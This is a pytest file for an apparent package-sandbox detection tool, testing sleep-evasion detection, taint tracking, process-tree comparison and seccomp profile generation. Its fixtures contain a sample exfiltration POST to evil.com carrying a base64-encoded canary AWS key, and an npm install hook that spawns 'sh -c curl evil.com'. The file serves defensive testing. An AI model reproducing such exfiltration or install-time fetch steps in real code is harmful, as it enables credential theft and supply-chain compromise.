"""Unit and property tests for advanced Tripwire features."""

import pytest
from tripwire.core.time_warp import TimeDilationEngine
from tripwire.core.taint_tracker import TaintTracker
from tripwire.core.tree_distance import ProcessTreeComparator, ProcessNode
from tripwire.core.seccomp_synthesizer import SeccompPolicySynthesizer
from tripwire.core.normalizer import TraceNormalizer
from tripwire.core.tracer import SyscallTracer
from tripwire.core.polyglot import get_adapter, Ecosystem


def test_time_dilation_detection():
    engine = TimeDilationEngine()
    sample_trace = [
        '1000 openat(AT_FDCWD, "/tmp/test.js", O_RDONLY) = 3',
        '1000 nanosleep({tv_sec=300, tv_nsec=0}, NULL) = 0',
        '1000 alarm(30) = 0',
    ]
    attempts = engine.inspect_trace_for_evasion(sample_trace)
    assert len(attempts) == 2
    assert attempts[0].technique == "SLEEP_BOMB"
    assert attempts[0].delay_requested_sec == 300.0
    assert attempts[0].bypassed is True
    assert engine.accumulated_virtual_offset_sec == 300.0


def test_shannon_entropy_and_taint_tracking():
    tracker = TaintTracker()
    
    # 1. Plain English vs High Entropy
    plain_text = "hello world from tripwire security engine"
    encrypted_blob = "8f3b92a1c0e4d7f6b8a2e1d0c9f4b3a2e1d0c9f8a7b6c5d4"
    
    h_plain = tracker.calculate_shannon_entropy(plain_text)
    h_enc = tracker.calculate_shannon_entropy(encrypted_blob)
    
    assert h_plain < 4.0
    assert h_enc > 3.8

    # 2. End-to-end Taint tracking
    sources = ["/home/sandbox-runner/.aws/credentials"]
    canaries = {"AKIA_TRIPWIRE_CANARY_01", "secret_key_12345"}
    
    # Test Base64 encoded canary detection in network payload
    # "AKIA_TRIPWIRE_CANARY_01" in base64 is "QUtJQV9UUklQV0lSRV9DQU5BUllfMDE="
    payload = "POST /exfil HTTP/1.1\r\nHost: evil.com\r\n\r\nQUtJQV9UUklQV0lSRV9DQU5BUllfMDE="
    incidents = tracker.analyze_taint_flow(sources, [payload], canaries)
    
    assert len(incidents) >= 1
    inc = incidents[0]
    assert inc.is_encrypted_or_obfuscated is True
    assert "Base64" in inc.hops[1].entity or "Base64" in inc.hops[2].evidence


def test_tree_edit_distance_algorithm():
    comparator = ProcessTreeComparator()

    # Tree A (Baseline): npm -> node
    tree_a = ProcessNode(id=1, name="npm", cmd="npm install", children=[
        ProcessNode(id=2, name="node", cmd="node install.js")
    ])

    # Tree B (Malicious): npm -> node -> [INSERTION: sh -> curl]
    tree_b = ProcessNode(id=1, name="npm", cmd="npm install", children=[
        ProcessNode(id=2, name="node", cmd="node install.js", children=[
            ProcessNode(id=3, name="sh", cmd="/bin/sh -c curl evil.com", children=[
                ProcessNode(id=4, name="curl", cmd="curl evil.com")
            ])
        ])
    ])

    res = comparator.compute_distance(tree_a, tree_b)
    assert res.distance > 0.0
    assert res.similarity_score < 1.0
    assert any("sh" in sub for sub in res.anomalous_subtrees)
    assert any("curl" in sub for sub in res.anomalous_subtrees)


def test_seccomp_bpf_policy_synthesis():
    synthesizer = SeccompPolicySynthesizer()
    tracer = SyscallTracer()
    tracer.parse_line('1000 openat(AT_FDCWD, "/detonation/index.js", O_RDONLY) = 3')
    
    fp = TraceNormalizer().canonicalize_trace(tracer, "clean-pkg", "1.0.0")
    profile = synthesizer.generate_seccomp_profile(fp)
    
    assert profile["defaultAction"] == "SCMP_ACT_ERRNO"
    allowed = set(profile["syscalls"][0]["names"])
    
    # Baseline had ZERO network and ZERO child processes:
    assert "socket" not in allowed
    assert "connect" not in allowed
    assert "openat" in allowed
    assert "read" in allowed


def test_polyglot_ecosystem_adapters():
    npm_adapter = get_adapter(Ecosystem.NPM)
    pypi_adapter = get_adapter(Ecosystem.PYPI)
    cargo_adapter = get_adapter(Ecosystem.CARGO)

    assert "npm" in npm_adapter.get_install_command("express", "4.18.2")[0]
    assert "pip" in pypi_adapter.get_install_command("requests", "2.31.0")[0]
    assert "cargo" in cargo_adapter.get_install_command("ripgrep", "14.1.0")[0]
